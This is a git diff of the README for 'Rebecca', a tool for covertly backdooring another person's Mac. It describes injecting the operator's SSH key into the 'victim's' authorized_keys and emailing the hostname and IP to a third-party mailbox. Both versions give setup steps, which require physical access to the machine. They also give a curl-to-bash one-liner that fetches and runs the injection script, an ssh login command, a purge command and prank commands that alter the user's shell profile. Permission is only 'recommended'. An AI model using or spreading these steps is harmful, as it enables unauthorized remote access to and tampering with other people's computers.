@@ -1,14 +1,17 @@
 # Rebecca
-Rebecca gives you access to another user's mac PC. Running this script injects ssh key into the victim's mac PC thus giving remote access.
+
+Rebecca gives you access to another user's Mac. Running this script injects SSH key into the victim's Mac thus giving remote access.
 
 **_I HIGHLY RECOMMEND GETTING PERMISSION FROM THE USER FIRST_**
 
-Rebecca consist of two scripts, one to add rsa public key into the authorized_keys of the user's mac PC and email relevant information for ssh to a third party mailbox. The other to remove rsa public key from the authorized_keys of the user's mac PC.
+Rebecca consist of two scripts, one to add rsa public key into the authorized_keys of the user's Mac and email relevant information for SSH to a third party mailbox. The other to remove rsa public key from the authorized_keys of the user's Mac.
 
-## Why Rebecca was created?
-Rebecca was created for fun :smirk:.
+## Use Case
 
-With ssh access, one can make a mac talk to the user, launch random browsers, sleep the mac PC, etc. Some interesting commands to play with:
+Rebecca could be modified to easily get SSH access to servers, but its current use is really just to troll people.
+
+With SSH access, one can make a mac talk to the user, launch random browsers, sleep the Mac, etc. Some interesting commands to play with:
+
 ```
 say -v veena hello world
 open "http://google.com"
@@ -16,29 +19,29 @@ pmset sleepnow
 echo "alias ls='say -v veena hello, why are you touching me'" >> ~/.bash_profile
 ```
 
-## How to use Rebecca?
-Before using Rebecca, there are a few configurations to make:
-1. you will want to clone this to your own github respository
-2. you will want to create a rsa key pair if you don't have one
-3. change the rsa public key in rebecca.sh to your own rsa public key (add your own identifier at the end)
-4. change the third party mailbox in rebecca.sh to your own mailbox
-5. change identifier in purge.sh to your identifier otherwise purge.sh will not work
+## Installtion Steps
 
-Steps to gain access:
-1. get physical access of a person's mac PC
-2. open terminal and run the bash command that links to rebecca.sh in repository, e.g.
-* `bash <(curl -s https://raw.githubusercontent.com/Milleus/rebecca/master/rebecca.sh)`
-3. turn on remote login sharing
-4. check mailbox for hostname and ip address
-5. ssh in with the hostname and ip address, e.g.
-* `ssh -i private_rsa_key_file hostname@192.168.123.123`
+1. You will want to clone this to your own github respository.
+2. You will want to create a rsa key pair if you don't have one.
+3. Change the rsa public key in `rebecca.sh` to your own rsa public key.
+4. Change the third party mailbox in `rebecca.sh` to your own mailbox.
+5. Change identifier in `purge.sh` to your identifier otherwise `purge.sh` will not work.
+6. You will need physical access to a users Mac with remote login turned on.
 
-To remove from user's mac PC:
-1. open terminal and run the bash command that links to purge.sh in repository, e.g.
-* `bash <(curl -s https://raw.githubusercontent.com/Milleus/rebecca/master/purge.sh)`
+## Commands
 
-## Possible improvements
-Rebecca relies on the ip address of the user's PC. In the event where the user is assigned another ip address, it will be impossible to ssh in. A solution to this problem would be to set up a scheduled job on the user's PC to send out its ip address in an email (crontabs?). There is currently no intention to further improve rebecca as this is only an experimental project.
+- `bash <(curl -s https://raw.githubusercontent.com/Milleus/rebecca/master/rebecca.sh)`
+
+  Runs rebecca script which basically injects your SSH key into the user's Mac authorized_keys, grabs relevant information and send it out to a mail server.
+
+- `ssh -i <private_rsa_key_file> <hostname>@<ip address>`
+
+  SSH into the user's Mac, get the relevant information from the mail server.
+
+- `bash <(curl -s https://raw.githubusercontent.com/Milleus/rebecca/master/purge.sh)`
+
+  Runs purge script which removes your SSH key from the user's Mac authorized_keys.
 
 ## Credits
-Thanks to Ryan Tan and Ken Chuan for this interesting idea and guidance, as well as all who have given me permission to experiment on their laptops :grin:.
+
+Thanks to Ryan Tan and Ken Chuan for this interesting idea and guidance, as well as all who have given me permission to experiment on their laptops.
